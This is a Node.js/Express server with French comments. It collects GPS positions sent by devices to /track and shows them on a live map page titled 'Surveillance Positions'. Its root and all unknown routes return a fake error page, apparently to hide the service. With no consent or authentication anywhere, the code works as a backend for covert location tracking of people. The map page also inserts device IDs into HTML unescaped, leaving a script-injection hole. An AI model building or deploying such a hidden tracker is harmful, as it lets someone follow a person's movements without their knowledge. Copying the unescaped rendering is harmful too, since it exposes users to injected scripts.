const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
app.use(express.json());

let positions = {};

// Endpoint pour recevoir les positions
app.post('/track', (req, res) => {
    const { deviceId, latitude, longitude, accuracy, timestamp } = req.body;
    
    positions[deviceId] = {
        lat: latitude,
        lon: longitude,
        accuracy: accuracy,
        timestamp: timestamp,
        lastUpdate: Date.now()
    };
    
    console.log(`Position reçue de ${deviceId}: ${latitude}, ${longitude}`);
    res.json({ success: true });
});

// Endpoint pour voir les positions (sur PC)
app.get('/view', (req, res) => {
    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Surveillance Positions</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: Arial; padding: 20px; }
            .device { margin: 10px; padding: 15px; background: #f0f0f0; }
            .map { height: 400px; width: 100%; }
        </style>
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    </head>
    <body>
        <h1>📡 Positions des Appareils</h1>
        <div id="devices"></div>
        <div id="map" class="map"></div>
        <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
        <script>
            const map = L.map('map').setView([48.8566, 2.3522], 10);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            const markers = {};
            
            function updatePositions() {
                fetch('/positions')
                    .then(r => r.json())
                    .then(data => {
                        let html = '';
                        for (const [deviceId, pos] of Object.entries(data)) {
                            const time = new Date(pos.timestamp).toLocaleTimeString();
                            const age = Math.floor((Date.now() - pos.lastUpdate) / 1000);
                            
                            html += \`
                            <div class="device">
                                <strong>Appareil: \${deviceId}</strong><br>
                                Position: \${pos.lat.toFixed(6)}, \${pos.lon.toFixed(6)}<br>
                                Précision: \${pos.accuracy}m<br>
                                Dernière mise à jour: \${time} (\${age} sec)
                            </div>\`;
                            
                            // Mettre à jour la carte
                            if (markers[deviceId]) {
                                markers[deviceId].setLatLng([pos.lat, pos.lon]);
                            } else {
                                markers[deviceId] = L.marker([pos.lat, pos.lon])
                                    .addTo(map)
                                    .bindPopup(\`Appareil: \${deviceId}\`);
                            }
                        }
                        document.getElementById('devices').innerHTML = html;
                        
                        // Recentrer la carte si des positions existent
                        if (Object.keys(data).length > 0) {
                            const firstPos = Object.values(data)[0];
                            map.setView([firstPos.lat, firstPos.lon], 13);
                        }
                    });
            }
            
            // Rafraîchir toutes les 5 secondes
            setInterval(updatePositions, 5000);
            updatePositions();
        </script>
    </body>
    </html>`;
    res.send(html);
});

// API pour récupérer les positions
app.get('/positions', (req, res) => {
    // Nettoyer les vieilles positions (> 5 minutes)
    const now = Date.now();
    for (const deviceId in positions) {
        if (now - positions[deviceId].lastUpdate > 300000) {
            delete positions[deviceId];
        }
    }
    res.json(positions);
});

// Serveur principal : renvoyer le fichier d'erreur statique
app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'deepseek_html_20251230_e95165 (1).html');
    // envoyer le fichier d'erreur avec un status 500
    res.status(500).sendFile(filePath);
});

// Catch-all : renvoyer la même page d'erreur pour toutes les routes non gérées
app.use((req, res) => {
    const filePath = path.join(__dirname, 'deepseek_html_20251230_e95165 (1).html');
    res.status(404).sendFile(filePath);
});

app.listen(3000, () => console.log('Serveur démarré sur port 3000'));